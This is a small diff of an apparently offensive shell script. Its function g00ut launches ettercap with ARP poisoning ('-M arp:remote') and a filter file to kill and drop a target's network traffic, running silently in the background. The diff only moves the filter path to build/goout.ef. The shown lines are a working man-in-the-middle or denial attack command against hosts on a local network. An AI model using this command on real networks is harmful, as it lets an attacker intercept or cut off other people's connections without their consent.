@@ -52,7 +52,7 @@ group=$bufgroup$bufip//
 
 function g00ut(){
 printf "\n\n\t[!] Starting Killing And Dropping \n"
-ettercap -TQ -i $1 -F /root/mybin/goout/goout.ef -M arp:remote $2 /$3//  1>/dev/null 2>/dev/null &
+ettercap -TQ -i $1 -F build/goout.ef -M arp:remote $2 /$3//  1>/dev/null 2>/dev/null &
 sleep 2
 printf "\n\n\t[+] Finished [+] "
 }
